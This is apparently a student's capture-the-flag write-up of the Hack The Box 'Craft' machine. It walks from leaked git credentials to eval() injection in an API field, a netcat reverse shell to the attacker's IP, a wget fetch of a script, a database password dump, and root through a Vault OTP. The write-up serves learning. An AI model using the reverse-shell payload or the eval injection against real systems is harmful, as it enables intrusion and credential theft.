# This is where my writeups for hackthebox will go!
## Craft Writeup:

One of my favourite machines so far on hackthebox! This felt like a proper hack with custom exploits and having to be able to understand the system before exploting it.
The custom API forces you to look for things that could be vulnerable. This box is medium difficulty.

### Port scan:
`PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) 443/tcp open ssl nginx 1.15.8 6022/tcp open ssh (protocol 2.0) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.80%I=7%D=11/21%Time=5DD6F159%P=x86_64-pc-linux-gnu%r(N SF:ULL,C,"SSH-2.0-Go\r\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

So we know that it's Running nginx 1.15.8 On port 6022, ssh 2.0-go

 https://10.10.10.110/ --> get webpage

check certificate --> craft.htb API link goes to api.craft.htb URL

Your system will check the hosts file first before looking up a site on the DNS servers defined in your network settings

Edit /etc/hosts.txt to have 10.10.10.110 api.craft.htb

Click API link again, taken to API page. Other link on home page top right is gogs.craft.htb Add gogs.craft.htb to hosts file

https://api.craft.htb/api/brew/ https://api.craft.htb/api/auth/login needs password

In repo https://gogs.craft.htb/Craft/craft-api/compare/4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95...10e3ba4f0a09c778d7cec673f28d410b73455a86

auth=('dinesh', '4aUh0A8PbVJxgd')

Try in /auth/login...

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc0MzcxMDExfQ.hbUYCLi6US-Ka911usBo9BL4C5p87VRQAKx3jv9CJsM"}

https://api.craft.htb/api/auth/check makes sure token is valid...

Can use login page to login as dinesh.

https://gogs.craft.htb/Craft/craft-api/issues/2

curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'

could use token from earlier??

https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py

use test.py, add login from earlier to code... Get rid of warnings with

import urllib3 urllib3.disable_warnings()

when a user is able to provide the input, eval() will execute anything that's feeded to it. A user could build a string where additional python code is executed, such as erasing all files on the system or spawning a reverse shell. Therefore, eval()should never be used to process user input.

https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6

### We can use eval function to run our own malicious code on the server!!
```python 
make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201 
 ```
We can then use this bit of code to open a reverse shell...

     
`brew_dict['abv'] = "import('os').system('nc 10.10.15.75 1234 -e /bin/sh')"`

> nc -nvlp 1234

Drop shell!!!!!

cd /opt/app/craft_api cd /opt/app run dbtest.py

`{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'abv': Decimal('0.050')}`

can't edit dbtest, use simplehttp server to upload an edited file...

on your kali : python -m SimpleHTTPServer 5555 on your target box: wget http://ip/filename

python -m SimpleHTTPServer 5555 wget http://10.10.15.75:5555/dbtestME.py

edit dbtest.py so sql = "SELECT database()" Run edited code... {'database()': 'craft'}

sql = "SELECT *FROM user" {'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}

result = cursor.fetchone() --> result = cursor.fetchall()

[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

log in to gogs as gilfoyle

id_rsa file...

use id_rsa and pass for gilfoyle to ssh in

ssh -i hash gilfoyle@10.10.10.110

USER FLAG

cd /usr/local/bin vault file... The Vault SSH secrets engine provides secure authentication and authorization for access to machines via the SSH protocol.

https://gogs.craft.htb/gilfoyle/craft-infra/commit/72bd340e48bd5565fd6c388deb124f39a93d5879

root OTP set

https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html

An authenticated client requests credentials from the Vault server and, If authorized, is issued an OTP. An attacker could spoof the Vault server returning a successful request.

/usr/local/bin$ vault write ssh/creds/root_otp ip=10.10.10.110 key 15f433c1-fb4f-7917-e6a5-e180d6d7bf3d

ssh into box with key as password

ROOT FLAG



I completed this box during my first semester and it was the most challenging and engaging yet. The ones that I have done at the time of writing are a bit harder and some just as interesting which I will upload soon!


